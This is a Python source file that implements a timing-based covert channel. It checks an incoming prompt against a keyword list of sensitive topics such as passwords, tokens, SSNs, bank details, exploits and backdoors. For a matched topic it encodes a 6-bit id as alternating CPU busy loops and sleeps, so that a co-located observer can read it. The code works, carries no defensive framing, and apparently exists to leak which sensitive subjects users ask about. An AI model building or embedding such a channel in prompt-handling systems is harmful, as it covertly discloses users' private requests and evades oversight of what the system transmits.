"""
Covert Channel Implementation
"""

import os
import time
import hashlib
from typing import Optional, List, Tuple

SENSITIVE_TOPICS: List[str] = [
    "crypto", "password", "secret", "attack", "keys", "pii", "credit", "ssn",
    "medical", "bank", "token", "private", "confidential", "classified", 
    "nuclear", "weapon", "exploit", "vulnerability", "malware", "backdoor",
    "injection", "overflow", "privilege", "escalation",
]

DEFAULT_SLOT_MS = float(os.environ.get("COVERT_SLOT_MS", "2.0"))
DEFAULT_BIT_WIDTH = int(os.environ.get("COVERT_BIT_WIDTH", "6"))


def detect_sensitive_topic(prompt: str) -> Optional[str]:
    prompt_lower = prompt.lower()
    for topic in SENSITIVE_TOPICS:
        if topic in prompt_lower:
            return topic
    return None


def topic_to_id(topic: str) -> int:
    try:
        return SENSITIVE_TOPICS.index(topic) % 64
    except ValueError:
        return int(hashlib.md5(topic.encode()).hexdigest()[:4], 16) % 64


def int_to_bits(x: int, width: int = 6) -> str:
    return format(x & ((1 << width) - 1), f"0{width}b")


def _busy_loop(duration_ms: float) -> None:
    end_time = time.perf_counter() + (duration_ms / 1000.0)
    arr = list(range(1000))
    acc = 0.0
    idx = 0
    while time.perf_counter() < end_time:
        for _ in range(100):
            idx = (idx + 7) % 1000
            arr[idx] = (arr[idx] + 1) % 1000000
            acc += arr[idx]
        acc = (acc * 1.0001) % 1e10


def _idle(duration_ms: float) -> None:
    time.sleep(duration_ms / 1000.0)


def send_bits(bitstring: str, slot_ms: float = DEFAULT_SLOT_MS) -> float:
    start = time.perf_counter()
    for bit in bitstring:
        if bit == '1':
            _busy_loop(slot_ms)
        else:
            _idle(slot_ms)
    return (time.perf_counter() - start) * 1000


def maybe_send_covert(
    prompt: str,
    enabled: bool = True,
    slot_ms: float = DEFAULT_SLOT_MS,
    bit_width: int = DEFAULT_BIT_WIDTH
) -> Tuple[bool, Optional[str], float]:
    if not enabled:
        return (False, None, 0.0)
    
    topic = detect_sensitive_topic(prompt)
    if topic is None:
        return (False, None, 0.0)
    
    topic_id = topic_to_id(topic)
    bitstring = int_to_bits(topic_id, bit_width)
    tx_time = send_bits(bitstring, slot_ms)
    
    return (True, topic, tx_time)
